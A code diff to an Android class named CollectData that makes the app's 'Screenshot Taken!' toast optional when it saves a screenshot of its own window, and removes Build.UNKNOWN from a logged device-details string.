@@ -38,14 +38,16 @@ public class CollectData {
         this.activity = activity;
     }
 
-    public void takeScreenshot(){
+    public void takeScreenshot(Boolean showScreenshotTakenToast){
         now = new Date();
         android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
 
         try {
             // image naming and path  to include sd card  appending name you choose for file
             String mPath = Environment.getExternalStorageDirectory().toString()+"/remoteAppScreens/" + now + ".jpg";
-            Toast.makeText(activity,"Screenshot Taken!",Toast.LENGTH_SHORT).show();
+            if(showScreenshotTakenToast){
+                Toast.makeText(activity,"Screenshot Taken!",Toast.LENGTH_SHORT).show();
+            }
             // create bitmap screen capture
             View v1 = activity.getWindow().getDecorView().getRootView();
             v1.setDrawingCacheEnabled(true);
@@ -87,7 +89,6 @@ public class CollectData {
                 +"\nTAGS : "+Build.TAGS
                 +"\nTIME : "+Build.TIME
                 +"\nTYPE : "+Build.TYPE
-                +"\nUNKNOWN : "+Build.UNKNOWN
                 +"\nUSER : "+Build.USER;
 
         writeToFile(details);
